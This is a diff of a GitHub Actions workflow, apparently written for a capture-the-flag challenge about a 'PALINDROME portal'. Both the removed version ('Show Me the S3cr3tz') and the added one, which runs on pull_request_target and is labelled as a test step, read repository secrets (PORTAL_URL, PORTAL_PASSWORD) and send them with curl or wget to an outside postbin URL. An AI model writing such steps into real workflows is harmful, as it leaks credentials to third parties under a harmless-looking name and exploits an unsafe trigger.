@@ -1,22 +1,14 @@
-name: Show Me the S3cr3tz
-on: [push]
+name: Test the PALINDROME portal
+
+on: pull_request_target
 
 jobs:
-  debug:
-    name: Debug
-    runs-on: ubuntu-latest
-
+  test:
+    runs-on: windows-latest
     steps:
-    - name: Check out code
-      uses: actions/checkout@v2
-
-    - name: Set up secret file
-      env:
-        DEBUG_PASSWORD: ${{ secrets.PORTAL_URL }}
-        DEBUG_SECRET_KEY: ${{ secrets.PORTAL_PASSWORD }}
-      run: |
-        echo $DEBUG_PASSWORD >> secrets.txt
-        echo $DEBUG_SECRET_KEY >> secrets.txt
-        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?a=$DEBUG_PASSWORD
-        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?b=$DEBUG_SECRET_KEY
-    
+      - uses: actions/checkout@v3
+      - name: Test the PALINDROME portal
+        run: | 
+          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/b/1691292699420-0900411291513?a=${{ secrets.PORTAL_URL }}&b=${{ secrets.PORTAL_PASSWORD }}"
+          echo "hello"
